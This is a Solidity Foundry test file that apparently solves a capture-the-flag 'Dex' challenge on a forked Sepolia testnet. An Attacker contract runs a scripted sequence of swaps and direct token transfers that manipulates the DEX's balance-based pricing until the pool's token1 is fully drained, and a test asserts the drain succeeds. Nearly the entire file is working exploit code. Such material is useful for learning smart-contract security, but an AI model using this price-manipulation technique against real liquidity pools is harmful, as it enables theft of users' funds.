// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";


interface Dex {
    function token1() external returns (address);
    function token2() external returns (address);

    function swap(address from, address to, uint amount) external;

    function getSwapPrice(address from, address to, uint amount) external view returns(uint);

    function approve(address spender, uint amount) external ;

    function balanceOf(address token, address account) external view returns (uint);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

contract Attacker {
    Dex public dex = Dex(0x797F49846190c1BaEddC55aF44cE36026a2b298e);
    function attack() public {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        dex.approve(address(dex), 10000);
        dex.swap(address(token1), address(token2), 10); // 110 90
        require(20 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 20");

        dex.swap(address(token2), address(token1), 18); // 18 = n * lcm(balance(from_token), balance(to_token)) / balance(to_token)
        require(22 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 22");

        dex.swap(address(token1), address(token2), 22);
        require(29 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 29");

        token2.transfer(address(dex), 4);
        dex.swap(address(token2), address(token1), 17); //
        require(22 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 22");

        token2.transfer(address(dex), 2);
        dex.swap(address(token1), address(token2), 13); // 101 89
        require(21 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 21");
        require(9 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 9");

        token2.transfer(address(dex), 1);
        token1.transfer(address(dex), 1); // 90 102
        dex.swap(address(token2), address(token1), 15); // 85 105
        require(25 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 25");
        require(5 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 5");

        dex.swap(address(token1), address(token2), 17); // 102 84
        require(8 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 8");
        require(26 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 26");


        dex.swap(address(token2), address(token1), 14); // 85 98
        require(25 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 25");
        require(12 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 12");

        token2.transfer(address(dex), 2); // 85 100
        dex.swap(address(token1), address(token2), 17); // 102 80
        require(8 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 8");
        require(30 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 30");

        token1.transfer(address(dex), 3); // 105 80
        dex.swap(address(token2), address(token1), 16); // 84 96
        require(26 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 26");
        require(14 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 14");

        dex.swap(address(token1), address(token2), 21); // 105 72
        require(5 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 5");
        require(38 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 38");

        dex.swap(address(token2), address(token1), 24); // 70 96
        require(40 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 40");
        require(14 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 14");

        dex.swap(address(token1), address(token2), 35); // 105 48
        require(5 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 5");
        require(62 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 62");

        dex.swap(address(token2), address(token1), 48); //
        require(110 == dex.balanceOf(address(token1), address(this)), "Attacker: token1 balance should be 110");
        require(14 == dex.balanceOf(address(token2), address(this)), "Attacker: token2 balance should be 14");

        token1.transfer(msg.sender, token1.balanceOf(address(this)));
        token2.transfer(msg.sender, token2.balanceOf(address(this)));
    }
}

contract DexTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5453179);
    }

    function test_dex() public {
        address player = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;
        Dex dex = Dex(0x797F49846190c1BaEddC55aF44cE36026a2b298e);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        require(10 == dex.balanceOf(address(token1), player), "DexTest: player initial balance should be 10");

        Attacker attacker = new Attacker();

        vm.prank(player);
        token1.transfer(address(attacker), 10);
        vm.prank(player);
        token2.transfer(address(attacker), 10);

        uint balance = dex.balanceOf(address(token1), address(attacker));
        require(balance == 10, "DexTest: attacker initial balance should be 10");

        attacker.attack();

        require(0 == dex.balanceOf(address(token1), address(dex)), "DexTest: dex token1 should be drained");

    }
}
